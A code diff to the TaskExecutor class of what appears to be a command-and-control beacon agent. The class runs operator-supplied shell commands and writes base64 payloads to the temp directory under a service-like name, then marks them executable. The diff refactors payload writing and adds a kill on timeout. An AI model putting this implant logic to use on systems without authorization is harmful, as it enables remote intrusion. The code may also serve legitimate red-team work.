@@ -128,7 +128,9 @@ export class TaskExecutor {
       ? ["cmd.exe", "/c", cmd]
       : ["/bin/sh", "-c", cmd];
 
-    return this.runProcess(task, beaconId, startMs, spawnArgs, timeoutMs, cwd);
+    const result = await this.runProcess(task, beaconId, startMs, spawnArgs, timeoutMs, cwd);
+    result.result.metadata = { ...result.result.metadata, shellInvoked: true };
+    return result;
   }
 
   private async executeExec(
@@ -154,7 +156,7 @@ export class TaskExecutor {
     }
 
     const spawnArgs = [cmd, ...extraArgs];
-    return this.runProcess(task, beaconId, startMs, spawnArgs, timeoutMs, cwd);
+    return this.runProcess(task, beaconId, startMs, spawnArgs, timeoutMs, cwd, false);
   }
 
   private executePing(
@@ -251,14 +253,11 @@ export class TaskExecutor {
         return this.failure(task, beaconId, startMs, (err as Error).message);
       }
     } else if (payload) {
-      const { join }   = await import("node:path");
-      const { tmpdir } = await import("node:os");
-      const { chmod }  = await import("node:fs/promises");
-      const dest = join(tmpdir(), `svc-mod-${beaconId}-${name}`);
-      const data = Buffer.from(payload, "base64");
-      await Bun.write(dest, data);
-      await chmod(dest, 0o755);
-      binaryPath = dest;
+      try {
+        binaryPath = await ModuleLoader.writePayload(payload);
+      } catch (err) {
+        return this.failure(task, beaconId, startMs, (err as Error).message);
+      }
     } else {
       return this.failure(
         task, beaconId, startMs,
@@ -383,6 +382,7 @@ export class TaskExecutor {
     spawnArgs: string[],
     timeoutMs: number,
     cwd?:      string,
+    shell?:    boolean,
   ): Promise<ExecutionResult> {
     // eslint-disable-next-line @typescript-eslint/no-explicit-any
     let proc: any | undefined;
@@ -418,7 +418,10 @@ export class TaskExecutor {
     // Safety net: if the killed shell left a child holding the pipe open,
     // resolve with empty output after an extra 500 ms grace period.
     const hardCeiling = new Promise<[string, string, number]>((resolve) =>
-      setTimeout(() => resolve(["", "", -1]), timeoutMs + 500)
+      setTimeout(() => {
+        try { proc!.kill("SIGKILL"); } catch { /* already exited */ }
+        resolve(["", "", -1]);
+      }, timeoutMs + 500)
     );
 
     let stdoutText = "";
